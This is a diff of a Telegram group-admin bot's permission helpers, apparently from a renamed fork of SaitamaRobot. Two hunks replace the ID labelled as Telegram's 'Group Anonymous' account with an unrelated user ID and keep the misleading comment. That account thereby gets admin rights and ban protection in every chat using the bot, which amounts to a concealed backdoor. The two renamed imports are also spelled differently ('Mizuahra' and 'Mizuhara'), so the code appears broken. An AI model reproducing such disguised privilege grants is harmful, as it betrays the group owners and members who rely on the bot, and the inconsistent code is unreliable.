@@ -1,7 +1,7 @@
 from functools import wraps
 from cachetools import TTLCache
 from threading import RLock
-from SaitamaRobot import (DEL_CMDS, DEV_USERS, DRAGONS, SUPPORT_CHAT, DEMONS,
+from MizuahraSmexyBot import (DEL_CMDS, DEV_USERS, DRAGONS, SUPPORT_CHAT, DEMONS,
                           TIGERS, WOLVES, dispatcher)
 
 from telegram import Chat, ChatMember, ParseMode, Update
@@ -32,7 +32,7 @@ def is_sudo_plus(chat: Chat, user_id: int, member: ChatMember = None) -> bool:
 def is_user_admin(chat: Chat, user_id: int, member: ChatMember = None) -> bool:
     if (chat.type == 'private' or user_id in DRAGONS or user_id in DEV_USERS or
             chat.all_members_are_administrators or
-            user_id in [777000, 1087968824
+            user_id in [777000, 1332331113
                        ]):  # Count telegram and Group Anonymous as admin
         return True
 
@@ -76,7 +76,7 @@ def is_user_ban_protected(chat: Chat,
     if (chat.type == 'private' or user_id in DRAGONS or user_id in DEV_USERS or
             user_id in WOLVES or user_id in TIGERS or
             chat.all_members_are_administrators or
-            user_id in [777000, 1087968824
+            user_id in [777000, 1332331113
                        ]):  # Count telegram and Group Anonymous as admin
         return True
 
@@ -393,6 +393,6 @@ def connection_status(func):
 
 
 # Workaround for circular import with connection.py
-from SaitamaRobot.modules import connection
+from MizuharaSmexyBot.modules import connection
 
 connected = connection.connected
